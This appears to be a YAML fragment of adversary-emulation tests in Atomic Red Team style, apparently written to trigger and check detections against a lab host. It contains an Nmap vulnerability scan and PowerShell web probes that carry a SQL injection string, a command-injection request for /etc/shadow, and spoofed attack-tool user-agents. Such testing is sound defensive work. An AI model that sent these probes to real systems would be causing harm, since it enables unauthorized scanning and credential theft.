  - name: T1595.002 - Vulnerability Scanning (Nmap NSE)
    auto_generated_guid: c3d4e5f6-a7b8-9012-3456-789abcdef012
    description: |
      Nmap Scripting Engine (NSE) to automatically scan for known vulnerabilities in Web (8080) and Mail (25, 143) applications.
    supported_platforms:
      - windows
    executor:
      name: powershell
      elevation_required: true
      command: |
        $nmapPath = "C:\Program Files (x86)\Nmap\nmap.exe"
        if (-not (Test-Path $nmapPath)) { $nmapPath = "C:\Program Files\Nmap\nmap.exe" }
        Write-Host "[*] [T1595.002] Dang chay Nmap Vuln Scan..." -ForegroundColor Cyan
        & $nmapPath -sV --script vuln -p 8080,25,143,993 192.168.1.2 -T4

  - name: T1190 - Exploit Public-Facing Application (Malicious Web Probes)
    auto_generated_guid: d4e5f6a7-b8c9-0123-4567-89abcdef0123
    description: |
      Malicious HTTP payload sending (SQLi, LFI, Command Injection) and user-agent spoofing are common attack tools.
    supported_platforms:
      - windows
    executor:
      name: powershell
      elevation_required: false
      command: |
        $target = "http://192.168.1.2:8080"
        Write-Host "[*] [T1190] Web Payload..." -ForegroundColor Cyan
        
        # Faking User-Agent Sqlmap and SQLi
        $headers = @{"User-Agent"="sqlmap/1.5.8#dev (http://sqlmap.org)"}
        $sqli_url = "$target/index.php?mail=admin' OR 1=1--"
        try { Invoke-WebRequest -Uri $sqli_url -Headers $headers -UseBasicParsing -TimeoutSec 5 | Out-Null } catch { }
        
        # Payload Command Injection (RCE)
        $headers2 = @{"User-Agent"="Mozilla/5.0 (Windows NT 10.0; Win64; x64) Nmap/7.94"}
        $rce_url = "$target/?cmd=cat+/etc/shadow"
        try { Invoke-WebRequest -Uri $rce_url -Headers $headers2 -UseBasicParsing -TimeoutSec 5 | Out-Null } catch { }

